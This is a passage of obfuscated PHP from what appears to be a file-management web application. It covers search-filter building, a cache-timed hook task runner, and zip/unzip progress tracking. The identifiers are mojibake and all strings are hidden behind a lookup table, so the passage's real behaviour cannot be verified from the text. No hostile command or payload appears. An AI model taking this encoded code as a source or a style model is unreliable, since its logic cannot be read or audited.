_parseSearchWhere($è¬Ó„ä®) { $®€šêµ¬ =& $_SERVER[Ü©»’·]; $†çïÚë¯ = array(); if (isset($è¬Ó„ä®[$®€šêµ¬[767]]) && $è¬Ó„ä®[$®€šêµ¬[767]]) { $†çïÚë¯[$®€šêµ¬[85]] = array($®€šêµ¬[2121], $è¬Ó„ä®[$®€šêµ¬[767]]); } if (isset($è¬Ó„ä®[$®€šêµ¬[506]]) && $è¬Ó„ä®[$®€šêµ¬[506]]) { $ Å˜¸® = array($®€šêµ¬[2122], $è¬Ó„ä®[$®€šêµ¬[506]]); if ($†çïÚë¯[$®€šêµ¬[85]]) { $†çïÚë¯[$®€šêµ¬[85]] = array($†çïÚë¯[$®€šêµ¬[85]], $ Å˜¸®, $®€šêµ¬[2123]); } else { $†çïÚë¯[$®€šêµ¬[85]] = $ Å˜¸®; } } if (isset($è¬Ó„ä®[$®€šêµ¬[2115]]) && $è¬Ó„ä®[$®€šêµ¬[2115]] > 0) { $†çïÚë¯[$®€šêµ¬[76]] = array($®€šêµ¬[2121], $è¬Ó„ä®[$®€šêµ¬[2115]]); } if (isset($è¬Ó„ä®[$®€šêµ¬[2116]]) && $è¬Ó„ä®[$®€šêµ¬[2116]]) { $ Å˜¸® = array($®€šêµ¬[2122], $è¬Ó„ä®[$®€šêµ¬[2116]]); if ($†çïÚë¯[$®€šêµ¬[76]]) { $†çïÚë¯[$®€šêµ¬[76]] = array($†çïÚë¯[$®€šêµ¬[76]], $ Å˜¸®, $®€šêµ¬[2123]); } else { $†çïÚë¯[$®€šêµ¬[76]] = $ Å˜¸®; } } if (isset($è¬Ó„ä®[$®€šêµ¬[609]]) && $è¬Ó„ä®[$®€šêµ¬[609]]) { $†çïÚë¯[] = array($®€šêµ¬[465] => $è¬Ó„ä®[$®€šêµ¬[609]], $®€šêµ¬[463] => $è¬Ó„ä®[$®€šêµ¬[609]], $®€šêµ¬[1003] => $®€šêµ¬[1956]); } if (isset($è¬Ó„ä®[$®€šêµ¬[421]]) && $è¬Ó„ä®[$®€šêµ¬[421]]) { $·Ü·ÍÆ‹ = $è¬Ó„ä®[$®€šêµ¬[421]]; if ($·Ü·ÍÆ‹ == $®€šêµ¬[75]) { $†çïÚë¯[$®€šêµ¬[419]] = 1; } else { if ($·Ü·ÍÆ‹ == $®€šêµ¬[2124]) { $†çïÚë¯[$®€šêµ¬[419]] = 0; } else { if ($·Ü·ÍÆ‹) { $·Ü·ÍÆ‹ = is_array($·Ü·ÍÆ‹) ? $·Ü·ÍÆ‹ : explode($®€šêµ¬[50], $·Ü·ÍÆ‹); $†çïÚë¯[$®€šêµ¬[421]] = array($®€šêµ¬[427], $·Ü·ÍÆ‹); $†çïÚë¯[$®€šêµ¬[419]] = 0; } } } } $this->_parseSearchParent($è¬Ó„ä®, $†çïÚë¯); if (isset($è¬Ó„ä®[$®€šêµ¬[1952]]) && trim($è¬Ó„ä®[$®€šêµ¬[1952]])) { $ä´‡šÂÚ = trim($è¬Ó„ä®[$®€šêµ¬[1952]]); $‚¤êœ³¯ = explode($®€šêµ¬[53], $ä´‡šÂÚ); if (strlen($ä´‡šÂÚ) > 2 && (substr($ä´‡šÂÚ, 0, 1) == $®€šêµ¬[118] && substr($ä´‡šÂÚ, -1) == $®€šêµ¬[118]) || substr($ä´‡šÂÚ, 0, 1) == $®€šêµ¬[58] && substr($ä´‡šÂÚ, -1) == $®€šêµ¬[58]) { $ä´‡šÂÚ = substr($ä´‡šÂÚ, 1, -1); $‚¤êœ³¯ = array($ä´‡šÂÚ); } $†çïÚë¯[$®€šêµ¬[32]] = array(array($®€šêµ¬[559], $®€šêµ¬[1954] . $ä´‡šÂÚ . $®€šêµ¬[1954])); if (count($‚¤êœ³¯) > 1) { $†çïÚë¯[$®€šêµ¬[32]] = array(); foreach ($‚¤êœ³¯ as $Õ½â¬èÜ) { if (!trim($Õ½â¬èÜ)) { continue; } $†çïÚë¯[$®€šêµ¬[32]][] = array($®€šêµ¬[559], $®€šêµ¬[1954] . trim($Õ½â¬èÜ) . $®€šêµ¬[1954]); } } } return $†çïÚë¯; } private function _parseSearchParent($Üï³–·, &$ÀöÈÆ) { $ËÑ÷›İ =& $_SERVER[Ü©»’·]; if (!isset($Üï³–·[$ËÑ÷›İ[441]]) || !$Üï³–·[$ËÑ÷›İ[441]]) { return; } $Çêà¾Ø× = $this->pathInfo($Üï³–·[$ËÑ÷›İ[441]]); $¿½è©Âü = $Çêà¾Ø×[$ËÑ÷›İ[441]] . $ËÑ÷›İ[12] === $ËÑ÷›İ[197]; $âÚ€¤íÍ = $Çêà¾Ø×[$ËÑ÷›İ[420]] == $ËÑ÷›İ[524]; if ($Çêà¾Ø×[$ËÑ÷›İ[541]] == $ËÑ÷›İ[542]) { $«á¬¿Á = $this->sourceInfo($Üï³–·[$ËÑ÷›İ[441]]); $Çêà¾Ø×[$ËÑ÷›İ[530]] = $«á¬¿Á[$ËÑ÷›İ[530]]; } $ÀöÈÆ[$ËÑ÷›İ[599]] = array($ËÑ÷›İ[559], $Çêà¾Ø×[$ËÑ÷›İ[530]] . $Üï³–·[$ËÑ÷›İ[441]] . $ËÑ÷›İ[560]); $ƒà§‚ºù = isset($Üï³–·[$ËÑ÷›İ[1817]]) && in_array($ËÑ÷›İ[524], $Üï³–·[$ËÑ÷›İ[1817]]); if (!$ƒà§‚ºù || !$âÚ€¤íÍ || !$¿½è©Âü || !$Çêà¾Ø×[$ËÑ÷›İ[422]]) { return; } if (!AuthModel::authCheckRoot($Çêà¾Ø×[$ËÑ÷›İ[422]][$ËÑ÷›İ[423]])) { return; } $€èœúÒÙ = $Çêà¾Ø×[$ËÑ÷›İ[514]] . $ËÑ÷›İ[12]; if ($€èœúÒÙ == $ËÑ÷›İ[88]) { unset($ÀöÈÆ[$ËÑ÷›İ[599]]); $ÀöÈÆ[$ËÑ÷›İ[420]] = self::TYPE_GROUP; return; } $æ«ÆôÍë = Model($ËÑ÷›İ[531])->groupChildrenAll($€èœúÒÙ); $Ñ‚Ö“œ³ = count($æ«ÆôÍë); if ($Ñ‚Ö“œ³ <= 1) { return; } $Ã£Š“Ù = array($ËÑ÷›İ[441] => 0, $ËÑ÷›İ[420] => self::TYPE_GROUP, $ËÑ÷›İ[514] => array($ËÑ÷›İ[7], $æ«ÆôÍë)); $á«€åíƒ = $this->field($ËÑ÷›İ[2125])->where($Ã£Š“Ù)->limit($Ñ‚Ö“œ³)->select(); $ÀöÈÆ[$ËÑ÷›İ[599]] = array(); foreach ($á«€åíƒ as $›©îšî) { $ÀöÈÆ[$ËÑ÷›İ[599]][] = array($ËÑ÷›İ[559], $ËÑ÷›İ[540] . $›©îšî[$ËÑ÷›İ[411]] . $ËÑ÷›İ[560]); } $ÀöÈÆ[$ËÑ÷›İ[599]][] = $ËÑ÷›İ[1956]; } } goto E«óğßğ ; c¡Ä¶¾ÖÙ÷: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($Ä³·­­†, $ÙºÈ›’Ş = 5.0) { if (!$Ä³·­­†) { return; } $œïğ¹İ÷ = Cache::get($Ä³·­­†); if (!$œïğ¹İ÷ || timeFloat() - floatVal($œïğ¹İ÷) >= $ÙºÈ›’Ş) { Cache::set($Ä³·­­†, timeFloat(), $ÙºÈ›’Ş * 10); return !0; } return !1; } public static function timeLimitCall($ÎÔ£€Úë, $ªšªü¿¡, $¸óì›©Ø, $¹¿ÉÜ´ = 5.0) { $¿Æ Áß =& $_SERVER[Ü©»’·]; if (!$ÎÔ£€Úë || !$ªšªü¿¡) { return; } self::$asyncAdd = !0; $º±åí™— = $¿Æ Áß[1772]; $íÛÉ–‰ù = Cache::get($º±åí™—, !0); $™Ò×Ü‚Ç = array($¿Æ Áß[1773] => timeFloat(), $¿Æ Áß[1774] => timeFloat(), $¿Æ Áß[264] => $ªšªü¿¡, $¿Æ Áß[1767] => $¸óì›©Ø, $¿Æ Áß[203] => $¹¿ÉÜ´); if (is_array($íÛÉ–‰ù[$ÎÔ£€Úë])) { $™Ò×Ü‚Ç[$¿Æ Áß[1774]] = $íÛÉ–‰ù[$ÎÔ£€Úë][$¿Æ Áß[1774]]; } if (is_array($íÛÉ–‰ù[$ÎÔ£€Úë])) { if (timeFloat() - $íÛÉ–‰ù[$ÎÔ£€Úë][$¿Æ Áß[1773]] < $™Ò×Ü‚Ç[$¿Æ Áß[203]] * 0.3) { return; } $™Ò×Ü‚Ç[$¿Æ Áß[1774]] = $íÛÉ–‰ù[$ÎÔ£€Úë][$¿Æ Áß[1774]]; } $íÛÉ–‰ù[$ÎÔ£€Úë] = $™Ò×Ü‚Ç; Cache::set($º±åí™—, $íÛÉ–‰ù, 60); Cache::removeMemory($º±åí™—); write_log($¿Æ Áß[1775] . $ÎÔ£€Úë . $¿Æ Áß[71] . $ªšªü¿¡, $¿Æ Áß[1769]); } public static function timeLimitCallLoop() { $ìæùõÍß =& $_SERVER[Ü©»’·]; $˜ßìó¹“ = array($ìæùõÍß[1776]); $¨ö·¾¡Ú = in_array(strtolower(ACTION), $˜ßìó¹“); if (!$¨ö·¾¡Ú && !self::$asyncAdd) { return; } $Š¨ø’Ó = $ìæùõÍß[1772]; $ä—ı·£ä = Cache::get($Š¨ø’Ó, !0); if (!$ä—ı·£ä || count($ä—ı·£ä) <= 0) { return; } $¤ŞŸüúÎ = !1; $£¶Ò¶‰Ç = timeFloat(); $şÓåò¥ƒ = array(); foreach ($ä—ı·£ä as $ÍÆ²ê¿ => $ßéÅğ„Å) { if ($£¶Ò¶‰Ç - $ßéÅğ„Å[$ìæùõÍß[1774]] > $ßéÅğ„Å[$ìæùõÍß[203]]) { $¤ŞŸüúÎ = !0; try { Hook::apply($ßéÅğ„Å[$ìæùõÍß[264]], $ßéÅğ„Å[$ìæùõÍß[1767]]); write_log($ìæùõÍß[1777] . $ÍÆ²ê¿ . $ìæùõÍß[71] . $ßéÅğ„Å[$ìæùõÍß[264]] . $ìæùõÍß[1778] . ACTION, $ìæùõÍß[1769]); } catch (Exception $ùİÇÅè) { } continue; } $şÓåò¥ƒ[$ÍÆ²ê¿] = $ßéÅğ„Å; } if (!$¤ŞŸüúÎ) { return; } if (!$şÓåò¥ƒ) { return Cache::remove($Š¨ø’Ó); } Cache::set($Š¨ø’Ó, $şÓåò¥ƒ, 60); Cache::removeMemory($Š¨ø’Ó); } public static function finished($€® ´éû, $ŞßğÅé) { $ƒ™¡ı€ =& $_SERVER[Ü©»’·]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ƒ™¡ı€[264] => $€® ´éû, $ƒ™¡ı€[1767] => $ŞßğÅé); } private static function finishedRun() { $Ä‡ôÓ€¤ =& $_SERVER[Ü©»’·]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $‰¬Êúæ) { try { Hook::apply($‰¬Êúæ[$Ä‡ôÓ€¤[264]], $‰¬Êúæ[$Ä‡ôÓ€¤[1767]]); } catch (Exception $Ö¶°ê‹) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $”Óı»šğ =& $_SERVER[Ü©»’·]; parent::startAfter(); Hook::bind($”Óı»šğ[1779], array($this, $”Óı»šğ[1780])); Hook::bind($”Óı»šğ[1197], array($this, $”Óı»šğ[1781])); $İƒê¦ŞŒ =& $this->task; $İƒê¦ŞŒ[$”Óı»šğ[1782]] = $”Óı»šğ[1198]; if (!$İƒê¦ŞŒ[$”Óı»šğ[1567]]) { $İƒê¦ŞŒ[$”Óı»šğ[1567]] = LNG($”Óı»šğ[1783]); } } protected function endAfter() { $Ç“ä‰Á— =& $_SERVER[Ü©»’·]; parent::endAfter(); Hook::unbind($Ç“ä‰Á—[1779], array($this, $Ç“ä‰Á—[1780])); Hook::unbind($Ç“ä‰Á—[1197], array($this, $Ç“ä‰Á—[1781])); } public function updateAfter() { $¥Í¿Ø¦Š =& $_SERVER[Ü©»’·]; $ğ·ñ¯ƒí =& $this->task; if (!$ğ·ñ¯ƒí[$¥Í¿Ø¦Š[792]] || !$ğ·ñ¯ƒí[$¥Í¿Ø¦Š[769]]) { return; } if ($ğ·ñ¯ƒí[$¥Í¿Ø¦Š[1782]] == $¥Í¿Ø¦Š[1198]) { $ä½æš¿Ù = 0; if ($ğ·ñ¯ƒí[$¥Í¿Ø¦Š[1722]]) { $ä½æš¿Ù = $ğ·ñ¯ƒí[$¥Í¿Ø¦Š[1723]] / $ğ·ñ¯ƒí[$¥Í¿Ø¦Š[1722]]; } $ğ·ñ¯ƒí[$¥Í¿Ø¦Š[1671]] = $ä½æš¿Ù * 0.3; } else { if ($ğ·ñ¯ƒí[$¥Í¿Ø¦Š[1782]] == $¥Í¿Ø¦Š[313]) { $ä½æš¿Ù = $ğ·ñ¯ƒí[$¥Í¿Ø¦Š[1670]] / $ğ·ñ¯ƒí[$¥Í¿Ø¦Š[792]]; $ğ·ñ¯ƒí[$¥Í¿Ø¦Š[1671]] = 0.3 + $ä½æš¿Ù * 0.4; } else { if ($ğ·ñ¯ƒí[$¥Í¿Ø¦Š[1782]] == $¥Í¿Ø¦Š[107]) { $Ç®ßºà = 0; if ($ğ·ñ¯ƒí[$¥Í¿Ø¦Š[1724]] == $¥Í¿Ø¦Š[107]) { $Ç®ßºà = $ğ·ñ¯ƒí[$¥Í¿Ø¦Š[1723]]; } $ä½æš¿Ù = ($ğ·ñ¯ƒí[$¥Í¿Ø¦Š[1727]] + $Ç®ßºà) / $ğ·ñ¯ƒí[$¥Í¿Ø¦Š[769]]; $ğ·ñ¯ƒí[$¥Í¿Ø¦Š[1671]] = 0.3 + 0.4 + $ä½æš¿Ù * 0.3; } } } if ($ğ·ñ¯ƒí[$¥Í¿Ø¦Š[1671]] > 0) { $Ûî‘ú—Ã = timeFloat() - $ğ·ñ¯ƒí[$¥Í¿Ø¦Š[1673]] - $ğ·ñ¯ƒí[$¥Í¿Ø¦Š[1676]]; $ğ·ñ¯ƒí[$¥Í¿Ø¦Š[1677]] = $Ûî‘ú—Ã * (1 - $ğ·ñ¯ƒí[$¥Í¿Ø¦Š[1671]]) / $ğ·ñ¯ƒí[$¥Í¿Ø¦Š[1671]]; } } public function addFile($¶«­¨Â) { $Êæ¿İÛ =& $_SERVER[Ü©»’·]; $Ğò¸Œí¯ =& $this->task; $ÁÍ‰øé = IO::info($¶«­¨Â); $Ğò¸Œí¯[$Êæ¿İÛ[1720]] = $ÁÍ‰øé[$Êæ¿İÛ[32]]; $Ğò¸Œí¯[$Êæ¿İÛ[1722]] = $ÁÍ‰øé[$Êæ¿İÛ[76]]; $Ğò¸Œí¯[$Êæ¿İÛ[1723]] = 0; $Ğò¸Œí¯[$Êæ¿İÛ[1067]] = $Êæ¿İÛ[1743]; $Ğò¸Œí¯[$Êæ¿İÛ[1724]] = $Êæ¿İÛ[1198]; $Ğò¸Œí¯[$Êæ¿İÛ[769]] = $ÁÍ‰øé[$Êæ¿İÛ[76]]; $Ğò¸Œí¯[$Êæ¿İÛ[792]] = 1; $Í¦äí = 0; $Ğò¸Œí¯[$Êæ¿İÛ[1731]] = array($Êæ¿İÛ[1732] => $Í¦äí + 1, $Êæ¿İÛ[429] => $ÁÍ‰øé[$Êæ¿İÛ[32]], $Êæ¿İÛ[84] => $ÁÍ‰øé[$Êæ¿İÛ[84]], $Êæ¿İÛ[528] => $ÁÍ‰øé[$Êæ¿İÛ[528]] ? $ÁÍ‰øé[$Êæ¿İÛ[528]] : $ÁÍ‰øé[$Êæ¿İÛ[84]]); $this->update(); } public function unzipAfter($ş¹¿“®Ü) { $ŞÖ¼æ¸Ğ =& $_SERVER[Ü©»’·]; $µ„Õ†â§ =& $this->task; $µ„Õ†â§[$ŞÖ¼æ¸Ğ[1782]] = $ŞÖ¼æ¸Ğ[107]; $ó¦ ÏÆà = IO::infoWithChildren($ş¹¿“®Ü); $Íâ„İÆû = 0; $µ„Õ†â§[$ŞÖ¼æ¸Ğ[1731]] = array($ŞÖ¼æ¸Ğ[1732] => $Íâ„İÆû + 1, $ŞÖ¼æ¸Ğ[429] => $ó¦ ÏÆà[$ŞÖ¼æ¸Ğ[32]], $ŞÖ¼æ¸Ğ[84] => $ó¦ ÏÆà[$ŞÖ¼æ¸Ğ[84]], $ŞÖ¼æ¸Ğ[528] => $ó¦ ÏÆà[$ŞÖ¼æ¸Ğ[528]] ? $ó¦ ÏÆà[$ŞÖ¼æ¸Ğ[528]] : $ó¦ ÏÆà[$ŞÖ¼æ¸Ğ[84]]); if ($ó¦ ÏÆà[$ŞÖ¼æ¸Ğ[33]] == $ŞÖ¼æ¸Ğ[199]) { $µ„Õ†â§[$ŞÖ¼æ¸Ğ[792]] = 1; } else { $µ„Õ†â§[$ŞÖ¼æ¸Ğ[792]] = $ó¦ ÏÆà[$ŞÖ¼æ¸Ğ[79]][$ŞÖ¼æ¸Ğ[77]]; } $µ„Õ†â§[$ŞÖ¼æ¸Ğ[1067]] = $ŞÖ¼æ¸Ğ[12]; $µ„Õ†â§[$ŞÖ¼æ¸Ğ[1724]] = 0; $µ„Õ†â§[$ŞÖ¼æ¸Ğ[1670]] = 0; $µ„Õ†â§[$ŞÖ¼æ¸Ğ[1722]] = 0; $µ„Õ†â§[$ŞÖ¼æ¸Ğ[1723]] = 0; $µ„Õ†â§[$ŞÖ¼æ¸Ğ[1720]] = $ŞÖ¼æ¸Ğ[12]; $µ„Õ†â§[$ŞÖ¼æ¸Ğ[1727]] = 0; $µ„Õ†â§[$ŞÖ¼æ¸Ğ[769]] = $ó¦ ÏÆà[$ŞÖ¼æ¸Ğ[76]]; $this->update(); self::log($ŞÖ¼æ¸Ğ[1784] . json_encode(array($µ„Õ†â§, $ó¦ ÏÆà))); } public function nameParse($êÎÃ®ëç) { $ã¡ğ°áÑ =& $_SERVER[Ü©»’·]; $Òìï—Š© =& $this->task; if ($Òìï—Š©[$ã¡ğ°áÑ[1782]] == $ã¡ğ°áÑ[1198]) { $Òìï—Š©[$ã¡ğ°áÑ[1782]] = $ã¡ğ°áÑ[313]; $Òìï—Š©[$ã¡ğ°áÑ[1727]] = 0; $Òìï—Š©[$ã¡ğ°áÑ[769]] = 0; } $öşÑ¸È€ = get_path_this($êÎÃ®ëç); if (strstr($öşÑ¸È€, $ã¡ğ°áÑ[10])) { $Òìï—Š©[$ã¡ğ°áÑ[1670]] += 1; $Òìï—Š©[$ã¡ğ°áÑ[792]] += 1; } $Òìï—Š©[$ã¡ğ°áÑ[1720]] = $êÎÃ®ëç; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $¾›á²° =& $_SERVER[Ü©»’·]; parent::startAfter(); Hook::bind($¾›á²°[1785], array($this, $¾›á²°[1780])); $Şğà¹Í =& $this->task; $Şğà¹Í[$¾›á²°[1782]] = $¾›á²°[1198]; if (!$Şğà¹Í[$¾›á²°[1567]]) { $Şğà¹Í[$¾›á²°[1567]] = LNG($¾›á²°[1786]); } } protected function endAfter() { $ØÇû’¸ú =& $_SERVER[Ü©»’·]; parent::endAfter(); Hook::unbind($ØÇû’¸ú[1785], array($this, $ØÇû’¸ú[1780])); } public function updateAfter() { $¹ÁĞ¾› =& $_SERVER[Ü©»’·]; $¬Ç—ô¯Ğ =& $this->task; if (!$¬Ç—ô¯Ğ[$¹ÁĞ¾›[792]] || !$¬Ç—ô¯Ğ[$¹ÁĞ¾›[769]]) { return; } if ($¬Ç—ô¯Ğ[$¹ÁĞ¾›[1782]] == $¹ÁĞ¾›[1198]) { $ıË¡ıÂÄ = $¬Ç—ô¯Ğ[$¹ÁĞ¾›[1723]]; if ($¬Ç—ô¯Ğ[$¹ÁĞ¾›[1724]] != $¹ÁĞ¾›[1198]) { $ıË¡ıÂÄ = 0; } $°†¬¬µÎ = ($¬Ç—ô¯Ğ[$¹ÁĞ¾›[1727]] + $ıË¡ıÂÄ) / $¬Ç—ô¯Ğ[$¹ÁĞ¾›[769]]; $¬Ç—ô¯Ğ[$¹ÁĞ¾›[1671]] = $°†¬¬µÎ * 0.3; } else { if ($¬Ç—ô¯Ğ[$¹ÁĞ¾›[1782]] == $¹ÁĞ¾›[313]) { $°†¬¬µÎ = $¬Ç—ô¯Ğ[$¹ÁĞ¾›[1670]] / $¬Ç—ô¯Ğ[$¹ÁĞ¾›[792]]; $¬Ç—ô¯Ğ[$¹ÁĞ¾›[1671]] = 0.3 + $°†¬¬µÎ * 0.5; } else { if ($¬Ç—ô¯Ğ[$¹ÁĞ¾›[1782]] == $¹ÁĞ¾›[107]) { $°†¬¬µÎ = 0; if ($¬Ç—ô¯Ğ[$¹ÁĞ¾›[1722]]) { $°†¬¬µÎ = $¬Ç—ô¯Ğ[$¹ÁĞ¾›[1723]] / $¬Ç—ô¯Ğ[$¹ÁĞ¾›[1722]]; } $¬Ç—ô¯Ğ[$¹ÁĞ¾›[1671]] = 0.3 + 0.5 + $°†¬¬µÎ * 0.2; } } } if ($¬Ç—ô¯Ğ[$¹ÁĞ¾›[1671]] > 0) { $°Ã¬Ñ™ = timeFloat() - $¬Ç—ô¯Ğ[$¹ÁĞ¾›[1673]] - $¬Ç—ô¯Ğ[$¹ÁĞ¾›[1676]]; $¬Ç—ô¯Ğ[$¹ÁĞ¾›[1677]] = $°Ã¬Ñ™ * (1 - $¬Ç—ô¯Ğ[$¹ÁĞ¾›[1671]]) / $¬Ç—ô¯Ğ[$¹ÁĞ¾›[1671]]; } } public function copyFileStart($÷„¦·ÛÙ, $÷¤­Œü§, $ôÄ½ó®¶, $ÙÁ™Ş—, $ÆÁßî¼³, $õïûû°¦) { $¹óÀêè‡ =& $_SERVER[Ü©»’·]; parent::copyFileStart($÷„¦·ÛÙ, $÷¤­Œü§, $ôÄ½ó®¶, $ÙÁ™Ş—, $ÆÁßî¼³, $õïûû°¦); $õİÔ¥Å™ =& $this->task; if ($õİÔ¥Å™[$¹óÀêè‡[1782]] == $¹óÀêè‡[313]) { $õİÔ¥Å™[$¹óÀêè‡[1782]] = $¹óÀêè‡[107]; } $this->update(); } public function copyFileEnd($¸ø³„üù, $è»Ÿ‹³ı, $ºù´¶«Ş, $¢ÄÉ™é, $Ï¹Ô›û , $š¿®÷¹—) { $ Ö†Ç =& $_SERVER[Ü©»’·]; $œÎĞ²Í =& $this->task; $œÎĞ²Í[$ Ö†Ç[1723]] = $œÎĞ²Í[$ Ö†Ç[1722]]; $œÎĞ²Í[$ Ö†Ç[1727]] += $œÎĞ²Í[$ Ö†Ç[1722]]; $œÎĞ²Í[$ Ö†Ç[1724]] = $ Ö†Ç[12]; $this->update(); } public function nameParse($°‡íéó”) { $‰­¤Ë§à =& $_SERVER[Ü©»’·]; $Ïœ™ÁØ‰ =& $this->task; if ($Ïœ™ÁØ‰[$‰­¤Ë§à[1670]] < $Ïœ™ÁØ‰[$‰­¤Ë§à[792]]) { $•ïšÜÆü = get_path_this($°‡íéó”); if (strstr($•ïšÜÆü, $‰­¤Ë§à[10])) { $Ïœ™ÁØ‰[$‰­¤Ë§à[1670]] += 1; } } if ($Ïœ™ÁØ‰[$‰­¤Ë§à[1782]] == $‰­¤Ë§à[1198]) { $Ïœ™ÁØ‰[$‰­¤Ë§à[1782]] = $‰­¤Ë§à[313]; } $Ïœ™ÁØ‰[$‰­¤Ë§à[1720]] = $°‡íéó”; $this->update(); } } goto E®­×ãß”Æ; FÓŞ¢ß¬‡: define($_SERVER[Ü©»’·][241], 1); define($_SERVER[Ü©»’·][242], 0); define($_SERVER[Ü©»’·][243], 2); goto bóÅİÓğÎø; EšÍ×Ô·‘µ: class Task { const STATYS_STOP = "\163\164\x6f\x70"; const STATYS_RUNNING = "\x72\165\156\156\x69\x6e\x67"; const STATYS_KILL = "\153\151\154\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($‡Àî½ªƒ, $È³º•¥ = '', $Ö£Åàø¢ = 0, $ÀØ·•Ó = '') { $Øõ”ë–å =& $_SERVER[Ü©»’·]; if (self::get($‡Àî½ªƒ)) { return; } $ÃáÌ»á± = defined($Øõ”ë–å[484]) ? USER_ID : $Øõ”ë–å[197]; $this->task = array($Øõ”ë–å[408] => $‡Àî½ªƒ, $Øõ”ë–å[1669] => $ÃáÌ»á±, $Øõ”ë–å[1567] => $ÀØ·•Ó, $Øõ”ë–å[462] => $Øõ”ë–å[12], $Øõ”ë–å[33] => $È³º•¥, $Øõ”ë–å[1067] => $Øõ”ë–å[12], $Øõ”ë–å[792] => $Ö£Åàø¢, $Øõ”ë–å[1670] => 0, $Øõ”ë–å[1671] => 0, $Øõ”ë–å[1672] => 0, $Øõ”ë–å[1673] => timeFloat(), $Øõ”ë–å[1674] => 0, $Øõ”ë–å[1675] => 0, $Øõ”ë–å[1676] => 0, $Øõ”ë–å[1677] => 0, $Øõ”ë–å[756] => $Øõ”ë–å[1628]); $GLOBALS[$Øõ”ë–å[1678]] = 1; Hook::bind($Øõ”ë–å[1633], array($this, $Øõ”ë–å[1679])); Hook::bind($Øõ”ë–å[1680], array($this, $Øõ”ë–å[1681])); $this->startAfter(); Hook::trigger($Øõ”ë–å[1682], $this->task); $this->task[$Øõ”ë–å[1675]] = timeFloat(); } public function end($‹¯µ³ãö = '') { $Àù¸¬‰ =& $_SERVER[Ü©»’·]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$Àù¸¬‰[1675]]) { self::valueSet($this->task[$Àù¸¬‰[408]], !1); } $this->isEnd = !0; if ($‹¯µ³ãö) { $this->task[$Àù¸¬‰[462]] = $‹¯µ³ãö; } self::log($Àù¸¬‰[1683] . $this->task[$Àù¸¬‰[408]] . $Àù¸¬‰[1684] . sprintf($Àù¸¬‰[856], timeFloat() - $this->task[$Àù¸¬‰[1673]]) . $Àù¸¬‰[1685]); Hook::unbind($Àù¸¬‰[1633], array($this, $Àù¸¬‰[1679])); Hook::unbind($Àù¸¬‰[1680], array($this, $Àù¸¬‰[1681])); $this->endAfter(); $ƒ“İñìâ = $this->task; $this->task = !1; Hook::trigger($Àù¸¬‰[1686], $ƒ“İñìâ); } public function update($½§£ğÙ¬ = 0, $¿¬Òú¸Ö = false) { $¨™ñ’´ =& $_SERVER[Ü©»’·]; $‘ˆåÑÎ© =& $this->task; if (!$‘ˆåÑÎ©) { return; } $‘ˆåÑÎ©[$¨™ñ’´[1670]] += $½§£ğÙ¬; $‘ˆåÑÎ©[$¨™ñ’´[1674]] = timeFloat(); if ($‘ˆåÑÎ©[$¨™ñ’´[792]]) { if ($‘ˆåÑÎ©[$¨™ñ’´[792]] < $‘ˆåÑÎ©[$¨™ñ’´[1670]]) { $‘ˆåÑÎ©[$¨™ñ’´[792]] = $‘ˆåÑÎ©[$¨™ñ’´[1670]]; } $Ú¹ºçî• = timeFloat() - $‘ˆåÑÎ©[$¨™ñ’´[1673]] - $‘ˆåÑÎ©[$¨™ñ’´[1676]]; if ($Ú¹ºçî• <= 0) { $Ú¹ºçî• = 0.001; } $‘ˆåÑÎ©[$¨™ñ’´[1671]] = $‘ˆåÑÎ©[$¨™ñ’´[1670]] / $‘ˆåÑÎ©[$¨™ñ’´[792]]; $‘ˆåÑÎ©[$¨™ñ’´[1672]] = $‘ˆåÑÎ©[$¨™ñ’´[1670]] / $Ú¹ºçî•; if ($‘ˆåÑÎ©[$¨™ñ’´[1671]] > 0) { $‘ˆåÑÎ©[$¨™ñ’´[1677]] = $Ú¹ºçî• * (1 - $‘ˆåÑÎ©[$¨™ñ’´[1671]]) / $‘ˆåÑÎ©[$¨™ñ’´[1671]]; } $‘ˆåÑÎ©[$¨™ñ’´[1677]] = $‘ˆåÑÎ©[$¨™ñ’´[1677]] <= 0 ? 0 : $‘ˆåÑÎ©[$¨™ñ’´[1677]]; } $this->updateAfter(); $±²ò©¼ = 0.2; if (timeFloat() - $‘ˆåÑÎ©[$¨™ñ’´[1675]] < $±²ò©¼ && !$¿¬Òú¸Ö) { return; } $ş­¡¾Ë = self::get($‘ˆåÑÎ©[$¨™ñ’´[408]]); $¢º¥âŞ¶ = $ş­¡¾Ë[$¨™ñ’´[756]]; if ($¢º¥âŞ¶ == self::STATYS_KILL) { $ÀŸÌ‡Ú¾ = array($¨™ñ’´[1687] => LNG($¨™ñ’´[1688]), $¨™ñ’´[1216] => !1); Cache::set($¨™ñ’´[1689] . $this->task[$¨™ñ’´[408]], $ÀŸÌ‡Ú¾, 30); $this->onKill(); $this->end(); die; } else { if ($¢º¥âŞ¶ == self::STATYS_STOP) { $¿Ÿ¯ğúÎ = 2; $ş­¡¾Ë[$¨™ñ’´[1676]] += $¿Ÿ¯ğúÎ; self::valueSet($‘ˆåÑÎ©[$¨™ñ’´[408]], $ş­¡¾Ë); sleep($¿Ÿ¯ğúÎ); $this->update(); return; } } $‘ˆåÑÎ©[$¨™ñ’´[756]] = $¢º¥âŞ¶ ? $¢º¥âŞ¶ : $‘ˆåÑÎ©[$¨™ñ’´[756]]; $‘ˆåÑÎ©[$¨™ñ’´[1676]] = $ş­¡¾Ë[$¨™ñ’´[1676]] ? $ş­¡¾Ë[$¨™ñ’´[1676]] : 0; $‘ˆåÑÎ©[$¨™ñ’´[1675]] = timeFloat(); Hook::trigger($¨™ñ’´[1690], $‘ˆåÑÎ©); self::valueSet($‘ˆåÑÎ©[$¨™ñ’´[408]], $‘ˆåÑÎ©); } public function onKillSet($—âŸåì¬, $¨‚–ª‚Ü = array()) { $this->onKillCall = array($—âŸåì¬, $¨‚–ª‚Ü); } public function onKill() { $÷åµøê =& $_SERVER[Ü©»’·]; self::log($÷åµøê[1683] . $this->task[$÷åµøê[408]] . $÷åµøê[1691]); Hook::trigger($÷åµøê[1692], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = 